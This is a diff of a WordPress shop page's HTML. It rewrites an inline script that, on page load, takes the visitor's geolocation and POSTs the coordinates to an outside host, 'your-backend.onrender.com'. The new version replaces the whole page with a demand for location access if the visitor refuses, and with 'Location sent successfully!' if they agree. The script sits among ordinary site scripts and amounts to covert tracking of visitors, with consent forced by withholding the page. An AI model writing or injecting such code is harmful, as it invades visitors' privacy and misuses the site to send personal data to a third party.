@@ -130,34 +130,41 @@ var cf7rl_ajax_object = {"cf7rl_ajax_url":"https://inventstore.in/wp-admin/admin
 </script>
 
 <script>
-    window.onload = function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            const data = {
-              lat: position.coords.latitude,
-              lon: position.coords.longitude
-            };
-
-            fetch("https://your-backend.onrender.com/location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => console.log("Server response:", result))
-            .catch(error => console.error("Error:", error));
-          },
-          function(error) {
-            console.error("Geolocation error:", error);
-          }
-        );
-      } else {
-        console.error("Geolocation not supported by this browser.");
+    document.addEventListener("DOMContentLoaded", function() {
+      if (!navigator.geolocation) {
+        // Browser doesn’t support geolocation
+        document.body.innerHTML = "<h2>Location services are not supported by your browser.</h2>";
+        return;
       }
-    };
-  </script>
 
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          // ✅ Location allowed
+          const data = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude
+          };
+
+          fetch("https://your-backend.onrender.com/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          })
+          .then(res => res.json())
+          .then(result => {
+            document.body.innerHTML = "<h2>Location sent successfully!</h2>";
+            console.log("Server response:", result);
+          })
+          .catch(err => console.error("Error:", err));
+        },
+        function(error) {
+          // ❌ Location denied or unavailable
+          document.body.innerHTML = "<h2>This page requires location access. Please enable location services and reload.</h2>";
+          console.error("Geolocation error:", error);
+        }
+      );
+    });
+  </script>
 	
 <script>
 	console.warn && console.warn("[GTM4WP] Google Tag Manager container code placement set to OFF !!!");
